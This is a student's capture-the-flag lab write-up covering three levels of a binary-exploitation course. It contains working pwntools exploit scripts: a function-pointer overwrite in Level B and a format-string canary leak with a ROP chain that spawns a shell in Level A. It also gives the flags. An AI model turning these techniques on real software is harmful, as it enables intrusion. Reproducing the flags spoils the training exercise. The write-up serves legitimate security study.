## lab08

**Level C**
The program will check the size of a file descriptor. However, if this fd is read after checking, it is able to leak the struct information by providing an input exceeds 255 bytes.

Two `strcpy` use the same buffer without initialization, hence the remain content in `fileContent1` is also copied into `fileContent2` (corrupted).

![flagc](08c1.png)

Flag is `3v3ryth1ng_Is_@_F1l3`.

---

**Level B**
The vulnerability lies on the `fave()` function, where memory copy is wrongly handled so that `v3` cannot copied to global `faves` array in a right manner.

```cpp
memcpy(faves[i], (int*)(&v3)+i, sizeof(struct vector));
```

`faves[i]` is a function pointer, so we can change it by giving intended input. This depends on the struct layout of `struct vector`. So I firstly give a probing vector to the input and check the memory layout:

```python
prob_vec = (chr(0x41), 0x4242, 0x4343, 0x44444444, 0x45454545, 0x46464646, 0x47474747, 0x4848484848484848, 0x4949494949494949)
```
![struct](08b1.png)

The `unsigned int` is 4 words apart from the start address, hence we can copy a pointer hidden in `v3.e //(unsined int)` to `faves[4].printFunc`.

`v3` can only be sumed by `v1` and `v2`, and both of them cannot contain 0 value. The pointer address is leaked directly in the main selection.

```python
from pwn import *

prob_vec = (chr(0x41), 0x4242, 0x4343, 0x44444444, 0x45454545, 0x46464646, 0x47474747, 0x4848484848484848, 0x4949494949494949)
one_vec = (chr(1), 1, 1, 1, 1, 1, 1, 1, 1)

p = process('./lab8B')

def send_data(sel, proc, vec):
    proc.sendline('1')
    proc.sendline(str(sel))
    for i in vec:
        proc.sendline(str(i))

def leak_addr(sel, proc):
    proc.sendline('3')
    proc.sendline(str(sel))
    proc.recvregex(r'Address: 0x[0-9a-f]{8}\n')
    ptr = proc.recvregex(r'printFunc: 0x[0-9a-f]{8}\n').strip()
    addr = int(ptr[-10:], 16)
    return addr

def sum_inject_load(proc):
    proc.sendline('2')
    for i in range(5):
        proc.sendline('4')
    proc.sendline('6')
    proc.sendline('4')
    proc.sendline('1')
	p.sendline('3')
	p.sendline('1')

send_data(1, p, one_vec)
printVector_addr = leak_addr(1, p)
thisIsASecret_addr = printVector_addr - (0x10e9 - 0x10a7)

mali_vec = ('q', 0x71, 0x71, 0x71, thisIsASecret_addr-1, 0x71, 0x71, 0x71, 0x71)
send_data(2, p, mali_vec)
sum_inject_load(p)

p.interactive()
```

![flagb](08b2.png)

The flag is `Th@t_w@5_my_f@v0r1t3_ch@11`.

(however, I does not consider the solution avoiding `thisIsASecret` function)

---

**Level A**
There are two places causes the exploitation to be possible. One is a format string that leaking information on the stack, another is a intensional stack overflow vul, which is protected by canaries.

Solution is using fsb leak the 4 bytes canaries, and then construct payload that return the address to a ROP chain. Since the stack address can be obtained by format string, we can easily place a `/bin/sh` string on the stack and let the shell code to reference this address.

```python
from pwn import *

p = remote('mbe', 8841)
p.recvuntil('Name: ')

p.sendline('imyourfather%130$08x%p/bin/sh')
p.recvuntil('imyourfather')
canary = int(p.recv(8), 16)
shaddr = int(p.recv(10), 16) + 22

chain = 8 * p32(0x0804e075)         # ret  % 8 times
chain += p32(0x080481c9)            # pop ebx
chain += p32(shaddr)                # % addr of /bin/sh
chain += p32(0x080e71c5)            # pop ecx
chain += p32(shaddr + 32)           # % null byte
chain += p32(0x0806f22a)            # pop edx
chain += p32(shaddr + 32)           # % null byte
chain += p32(0x08054ab0)            # xor eax, eax
chain += 0xb * p32(0x0807bc96)      # inc eax  % 11 times
chain += p32(0x08048ef6)            # int 0x80

PIVOT_ADDR = 0x080560ab             # add esp, 8
p.sendline(chain)
tobufsec = cyclic(512) + p32(canary) + p32(0xdeadbeef) + p32(PIVOT_ADDR)
p.sendline(tobufsec)
p.sendline('A')

p.interactive()
```

![flaga](08a1.png)

The flag is `H4x0r5_d0nt_N33d_m3t4pHYS1c5`.
